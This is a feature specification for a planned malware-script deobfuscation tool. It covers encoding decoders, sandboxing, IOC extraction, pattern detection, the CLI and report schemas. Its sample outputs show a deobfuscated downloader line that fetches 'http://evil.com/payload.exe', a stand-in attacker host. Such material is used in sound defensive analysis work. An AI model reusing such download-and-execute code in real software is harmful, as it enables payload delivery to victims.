# Deobfuscation Tool - Feature Specification

## Overview

**Feature Name:** Deobfuscation Tool
**Module:** deobfuscator
**Status:** Planned
**Version:** 1.0.0 (planned)
**Priority:** High
**Target Release:** Phase 4

## Purpose

The Deobfuscation Tool analyzes and deobfuscates malicious scripts (JavaScript, PowerShell, VBScript, Batch) by detecting and reversing common obfuscation techniques including base64 encoding, hex encoding, string concatenation, character substitution, and multi-layer encoding. It provides safe sandbox execution and automatic IOC extraction from deobfuscated code.

## User Stories

### Primary Use Cases

1. **As a Malware Analyst**, I want to deobfuscate a heavily obfuscated JavaScript file to understand its malicious behavior
2. **As an Incident Responder**, I need to quickly decode a base64-encoded PowerShell command found in logs
3. **As a Threat Researcher**, I want to extract IOCs (URLs, IPs, domains) from obfuscated malware droppers
4. **As a SOC Analyst**, I need to analyze suspicious VBScript files attached to phishing emails
5. **As a Security Engineer**, I want to automatically deobfuscate and analyze scripts in a safe sandbox environment

## Functional Requirements

### FR-1: Multi-Language Support
- **Description**: Support multiple scripting languages
- **Supported Languages**:
  - JavaScript/JScript
  - PowerShell
  - VBScript
  - Batch/CMD
  - Python (obfuscated scripts)
  - PHP
  - Shell scripts (Bash)
- **Auto-Detection**: Automatic language detection
- **Syntax Validation**: Verify syntax after deobfuscation

### FR-2: Encoding Detection and Decoding
- **Description**: Detect and decode common encoding schemes
- **Encoding Types**:
  - Base64 (standard, URL-safe, modified)
  - Hex encoding
  - URL encoding
  - ROT13/Caesar cipher
  - ASCII decimal/octal
  - Unicode escape sequences
  - HTML entities
- **Multi-Layer**: Recursive decoding for nested encodings
- **Auto-Detection**: Automatic encoding detection

### FR-3: String Deobfuscation
- **Description**: Reverse string obfuscation techniques
- **Techniques**:
  - String concatenation (`'ma'+'lware'`)
  - Character substitution
  - String reversal
  - XOR obfuscation
  - Split/join operations
  - Character code conversion (`chr(65)`)
- **Pattern Recognition**: Identify obfuscation patterns

### FR-4: PowerShell Deobfuscation
- **Description**: Specialized PowerShell deobfuscation
- **Techniques**:
  - Encoded commands (`-EncodedCommand`)
  - Backtick obfuscation
  - String formatting (`-f` operator)
  - Invoke-Expression (IEX) chains
  - Invoke-Obfuscation patterns
  - Variable substitution
  - Compressed/encrypted payloads
- **Layers**: Handle multi-stage PowerShell droppers

### FR-5: JavaScript Deobfuscation
- **Description**: JavaScript-specific deobfuscation
- **Techniques**:
  - eval() chains
  - Array-based obfuscation
  - Hexadecimal escape sequences
  - Unicode escaping
  - JSFuck/Hieroglyphy
  - Packer/obfuscator tools (Dean Edwards, JavaScript Obfuscator)
  - String.fromCharCode()
- **AST Analysis**: Abstract syntax tree analysis

### FR-6: Safe Sandbox Execution
- **Description**: Safely execute and trace obfuscated code
- **Sandbox Features**:
  - Isolated execution environment
  - Timeout limits
  - Resource limits (CPU, memory)
  - Network blocking
  - File system isolation
- **Tracing**: Capture execution flow and API calls
- **Safety**: No actual file writes or network activity

### FR-7: Multi-Layer Deobfuscation
- **Description**: Handle nested/multi-stage obfuscation
- **Features**:
  - Iterative deobfuscation
  - Layer detection (up to 10 layers)
  - Progress tracking per layer
  - Layer-by-layer output
- **Termination**: Detect when fully deobfuscated
- **Recursion Limit**: Prevent infinite loops

### FR-8: IOC Extraction
- **Description**: Extract IOCs from deobfuscated code
- **IOC Types**:
  - URLs
  - IP addresses
  - Domain names
  - File hashes
  - Email addresses
  - File paths
  - Registry keys
  - Cryptocurrency addresses
- **Integration**: Leverage existing IOC Extractor tool
- **Automatic**: Auto-extract after deobfuscation

### FR-9: Pattern Detection
- **Description**: Identify malicious code patterns
- **Patterns**:
  - Downloader behavior (WebClient, Invoke-WebRequest)
  - Process injection
  - Privilege escalation
  - Anti-analysis techniques
  - Credential theft
  - Persistence mechanisms
  - Fileless malware
- **MITRE ATT&CK**: Map to ATT&CK techniques

### FR-10: Code Beautification
- **Description**: Format deobfuscated code for readability
- **Features**:
  - Syntax highlighting
  - Indentation normalization
  - Variable renaming (optional)
  - Comment insertion
  - Line numbering
- **Formatters**: Language-specific formatters

### FR-11: Analysis Report Generation
- **Description**: Generate comprehensive analysis reports
- **Report Contents**:
  - Original obfuscated code
  - Deobfuscation layers
  - Final deobfuscated code
  - Detected obfuscation techniques
  - Extracted IOCs
  - Malicious patterns detected
  - MITRE ATT&CK mapping
  - Risk assessment
- **Formats**: JSON, HTML, Markdown, PDF

### FR-12: Batch Processing
- **Description**: Process multiple files in batch
- **Features**:
  - Directory scanning
  - Parallel processing
  - Progress reporting
  - Result aggregation
- **Output**: Combined report for all files

### FR-13: Obfuscation Technique Detection
- **Description**: Identify specific obfuscation tools/methods
- **Detectable Tools**:
  - Invoke-Obfuscation (PowerShell)
  - JavaScript Obfuscator
  - PyArmor (Python)
  - UPX (executable packer - note only)
  - Custom obfuscators
- **Signatures**: Tool-specific signatures
- **Confidence**: Detection confidence score

### FR-14: Diff Comparison
- **Description**: Compare original vs deobfuscated code
- **Features**:
  - Side-by-side diff view
  - Highlight changes
  - Statistics (lines added/removed)
- **Output**: Unified diff format

### FR-15: CLI and Library Interface
- **Description**: Both CLI tool and Python library
- **CLI**: Command-line tool for manual analysis
- **Library**: Import as Python module for automation
- **API**: Simple function-based API
- **Examples**: Comprehensive usage examples

## Non-Functional Requirements

### NFR-1: Safety
- **Requirement**: Never execute code outside sandbox
- **Implementation**: Strict sandboxing, no actual system calls
- **Validation**: Security testing, code review

### NFR-2: Performance
- **Requirement**: Deobfuscate 1MB script in under 10 seconds
- **Implementation**: Efficient algorithms, caching, parallel processing
- **Monitoring**: Performance benchmarking

### NFR-3: Accuracy
- **Requirement**: 95%+ success rate on common obfuscation techniques
- **Implementation**: Comprehensive pattern library, ML-based detection
- **Testing**: Large corpus of obfuscated samples

### NFR-4: Reliability
- **Requirement**: Handle malformed/corrupted scripts gracefully
- **Implementation**: Exception handling, input validation
- **Recovery**: Partial deobfuscation on failures

### NFR-5: Usability
- **Requirement**: Simple CLI with sensible defaults
- **Implementation**: Clear help text, examples, verbose mode
- **Documentation**: Comprehensive guide with examples

## Technical Design

### Architecture

```
deobfuscator/
├── deobfuscator.py        # Main deobfuscation engine
├── languages/            # Language-specific handlers
│   ├── __init__.py
│   ├── javascript.py     # JavaScript deobfuscation
│   ├── powershell.py     # PowerShell deobfuscation
│   ├── vbscript.py       # VBScript deobfuscation
│   ├── batch.py          # Batch/CMD deobfuscation
│   └── python.py         # Python deobfuscation
├── decoders/            # Encoding decoders
│   ├── __init__.py
│   ├── base64_decoder.py
│   ├── hex_decoder.py
│   ├── url_decoder.py
│   └── unicode_decoder.py
├── patterns/            # Malware pattern detection
│   ├── __init__.py
│   └── patterns.yaml     # Pattern definitions
├── sandbox/             # Safe execution sandbox
│   ├── __init__.py
│   └── sandbox.py        # Sandbox implementation
├── reports/             # Report generators
│   ├── __init__.py
│   ├── json_report.py
│   ├── html_report.py
│   └── markdown_report.py
└── tests/               # Test samples
    ├── javascript/
    ├── powershell/
    └── vbscript/
```

### Core Classes

```python
class Deobfuscator:
    """Main deobfuscation engine"""
    def __init__(self, language: str = 'auto', max_layers: int = 10)
    def deobfuscate(self, code: str) -> DeobfuscationResult
    def detect_language(self, code: str) -> str
    def detect_encoding(self, code: str) -> List[str]

class LanguageHandler:
    """Base class for language-specific handlers"""
    def detect_obfuscation(self, code: str) -> List[str]
    def deobfuscate(self, code: str) -> str
    def beautify(self, code: str) -> str

class EncodingDecoder:
    """Base class for encoding decoders"""
    def detect(self, data: str) -> bool
    def decode(self, data: str) -> str

class Sandbox:
    """Safe code execution sandbox"""
    def __init__(self, timeout: int = 10, memory_limit: int = 100)
    def execute(self, code: str, language: str) -> SandboxResult
    def trace_execution(self) -> List[str]

class PatternDetector:
    """Detect malicious patterns in code"""
    def detect_patterns(self, code: str) -> List[Pattern]
    def map_to_attack(self, patterns: List[Pattern]) -> List[str]

class ReportGenerator:
    """Generate analysis reports"""
    def generate_report(self, result: DeobfuscationResult, format: str) -> str
```

### Data Structures

#### Deobfuscation Result
```python
{
    "original_code": "...",
    "final_code": "...",
    "language": "powershell",
    "layers": [
        {
            "layer_num": 1,
            "technique": "base64_encoding",
            "code_before": "...",
            "code_after": "..."
        },
        {
            "layer_num": 2,
            "technique": "string_concatenation",
            "code_before": "...",
            "code_after": "..."
        }
    ],
    "detected_techniques": [
        "base64_encoding",
        "string_concatenation",
        "invoke_expression"
    ],
    "extracted_iocs": {
        "urls": ["http://malicious.com/payload.exe"],
        "ips": ["1.2.3.4"],
        "domains": ["evil.com"]
    },
    "malicious_patterns": [
        {
            "pattern": "downloader",
            "confidence": 95,
            "description": "Downloads file from remote server",
            "mitre_attack": "T1105"
        }
    ],
    "risk_score": 85,
    "verdict": "malicious"
}
```

### Algorithms

#### Multi-Layer Deobfuscation Algorithm
```python
1. Detect language (if auto mode)
2. Initialize layer counter = 0
3. current_code = original_code
4. while layer_counter < max_layers:
   a. Detect obfuscation techniques in current_code
   b. If no obfuscation detected:
      - Break (fully deobfuscated)
   c. Apply deobfuscation techniques
   d. new_code = deobfuscate(current_code)
   e. If new_code == current_code:
      - Break (no progress)
   f. Store layer info
   g. current_code = new_code
   h. layer_counter += 1
5. Beautify final code
6. Extract IOCs
7. Detect malicious patterns
8. Generate report
```

## Command-Line Interface

### Syntax
```bash
python deobfuscator.py [options] <input_file>
```

### Commands

#### Basic Deobfuscation
```bash
# Deobfuscate a JavaScript file
python deobfuscator.py malware.js

# Deobfuscate PowerShell script
python deobfuscator.py script.ps1

# Specify language manually
python deobfuscator.py --language powershell encoded.txt

# Output to file
python deobfuscator.py malware.js --output deobfuscated.js

# Verbose mode (show all layers)
python deobfuscator.py malware.js --verbose
```

#### Advanced Options
```bash
# Extract IOCs automatically
python deobfuscator.py malware.js --extract-iocs

# Generate HTML report
python deobfuscator.py malware.js --report html --output report.html

# Limit deobfuscation layers
python deobfuscator.py malware.js --max-layers 5

# Batch process directory
python deobfuscator.py --directory /samples/ --recursive

# Decode base64 string directly
python deobfuscator.py --decode-base64 "SGVsbG8gV29ybGQ="

# Decode hex string
python deobfuscator.py --decode-hex "48656c6c6f"
```

### Unified CLI Integration
```bash
# Via vlair
vlair deobfuscate malware.js
vlair deobfuscate script.ps1 --extract-iocs
vlair deobfuscate --decode-base64 "..."
```

### Examples

```bash
# Example 1: Deobfuscate and extract IOCs
python deobfuscator.py suspicious.js --extract-iocs --output results.json

# Example 2: Batch processing
python deobfuscator.py --directory /malware_samples/ --report html

# Example 3: PowerShell encoded command
python deobfuscator.py --language powershell encoded_cmd.txt --verbose

# Example 4: Quick base64 decode
python deobfuscator.py --decode-base64 "VGhpcyBpcyBhIHRlc3Q="

# Example 5: Full analysis with report
python deobfuscator.py malware.js --verbose --extract-iocs --report html --output report.html
```

## Output Schema

### JSON Output
```json
{
  "metadata": {
    "tool": "deobfuscator",
    "version": "1.0.0",
    "analysis_date": "2025-11-20T10:00:00Z",
    "input_file": "malware.js",
    "language": "javascript"
  },
  "original": {
    "size": 5432,
    "hash": "abc123...",
    "entropy": 7.2
  },
  "deobfuscation": {
    "layers_processed": 3,
    "techniques_detected": [
      "base64_encoding",
      "string_concatenation",
      "eval_chain"
    ],
    "layers": [
      {
        "layer": 1,
        "technique": "base64_encoding",
        "size_before": 5432,
        "size_after": 2156
      }
    ]
  },
  "final_code": "var url = 'http://evil.com/payload.exe';\nfetch(url)...",
  "extracted_iocs": {
    "urls": ["http://evil.com/payload.exe"],
    "ips": ["1.2.3.4"],
    "domains": ["evil.com"]
  },
  "malicious_patterns": [
    {
      "pattern": "downloader",
      "confidence": 95,
      "description": "Downloads and executes remote payload",
      "mitre_attack": ["T1105", "T1059.007"],
      "code_snippet": "fetch(url).then..."
    }
  ],
  "verdict": "malicious",
  "risk_score": 90
}
```

### HTML Report
```html
<!DOCTYPE html>
<html>
<head>
    <title>Deobfuscation Report - malware.js</title>
    <style>
        .code { background: #f5f5f5; padding: 10px; }
        .layer { border-left: 3px solid #007bff; margin: 10px 0; }
        .ioc { color: #dc3545; font-weight: bold; }
        .pattern { background: #fff3cd; padding: 5px; }
    </style>
</head>
<body>
    <h1>Deobfuscation Analysis Report</h1>
    <h2>File: malware.js</h2>

    <h3>Summary</h3>
    <ul>
        <li>Verdict: <span class="verdict-malicious">MALICIOUS</span></li>
        <li>Risk Score: 90/100</li>
        <li>Layers: 3</li>
        <li>IOCs Found: 3</li>
    </ul>

    <h3>Deobfuscation Layers</h3>
    <!-- Layer details -->

    <h3>Final Deobfuscated Code</h3>
    <pre class="code">
    <code>var url = 'http://evil.com/payload.exe';
fetch(url)...</code>
    </pre>

    <h3>Extracted IOCs</h3>
    <!-- IOC table -->

    <h3>Malicious Patterns</h3>
    <!-- Pattern analysis -->
</body>
</html>
```

## Configuration

### Configuration File: `~/.deobfuscator/config.yaml`

```yaml
# Deobfuscator Configuration

# General Settings
general:
  max_layers: 10
  timeout: 60                       # seconds
  auto_detect_language: true

# Language Settings
languages:
  javascript:
    enabled: true
    beautify: true
    ast_analysis: true

  powershell:
    enabled: true
    beautify: true
    decode_encoded_commands: true

  vbscript:
    enabled: true

  python:
    enabled: true

# Deobfuscation Techniques
techniques:
  base64: true
  hex: true
  url_encoding: true
  string_concat: true
  char_code: true
  xor: false                        # Experimental

# Sandbox Settings
sandbox:
  enabled: true
  timeout: 10                       # seconds
  memory_limit_mb: 100
  block_network: true

# IOC Extraction
ioc_extraction:
  auto_extract: true
  types: [url, ip, domain, email, hash]

# Pattern Detection
patterns:
  detect_downloader: true
  detect_injection: true
  detect_persistence: true
  detect_anti_analysis: true

# Output
output:
  default_format: json
  beautify_code: true
  include_original: true
  show_all_layers: false            # Only in verbose mode

# Reporting
reporting:
  generate_html: false              # Auto-generate HTML report
  include_screenshots: false
  template_path: ~/.deobfuscator/templates/
```

## Dependencies

### Python Packages
```
requests>=2.31.0                  # HTTP requests
beautifulsoup4>=4.12.0            # HTML parsing
jsbeautifier>=1.14.0              # JavaScript beautifier
chardet>=5.2.0                    # Character encoding detection
regex>=2023.10.0                  # Advanced regex
pyyaml>=6.0                       # Config files
jinja2>=3.1.2                     # HTML report templates
pygments>=2.16.0                  # Syntax highlighting
```

## Testing Strategy

### Unit Tests
1. **Encoding Detection**: Test all encoding types
2. **Decoders**: Test each decoder independently
3. **Language Handlers**: Test language-specific deobfuscation
4. **Pattern Detection**: Test malware pattern matching
5. **IOC Extraction**: Test IOC extraction accuracy

### Integration Tests
1. **Multi-Layer**: Test nested obfuscation
2. **End-to-End**: Full deobfuscation workflow
3. **Batch Processing**: Multiple file processing
4. **Report Generation**: All report formats

### Test Data
- Real-world obfuscated malware samples
- Invoke-Obfuscation PowerShell samples
- JSFuck JavaScript samples
- Multi-layer encoded samples

## Future Enhancements

### Phase 2
- **Machine Learning**: ML-based obfuscation detection
- **More Languages**: C#, Ruby, Perl
- **Advanced Sandbox**: Full VM-based sandbox
- **API Server**: REST API for deobfuscation service
- **Browser Extension**: Browser-based deobfuscation

### Phase 3
- **Real-time Monitoring**: Monitor running scripts
- **Automated Analysis**: Integrate with malware analysis pipeline
- **Signature Generation**: Auto-generate detection signatures
- **Threat Intelligence**: Feed deobfuscated code to threat feeds

## References

- [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
- [javascript-obfuscator](https://github.com/javascript-obfuscator/javascript-obfuscator)
- [JSFuck](http://www.jsfuck.com/)
- [PowerShell Obfuscation Techniques](https://www.fireeye.com/blog/threat-research/2017/06/obfuscation-in-the-wild.html)
- [OWASP Secure Coding](https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/)

---

**Last Updated:** 2025-11-20
**Status:** Specification Complete - Ready for Implementation
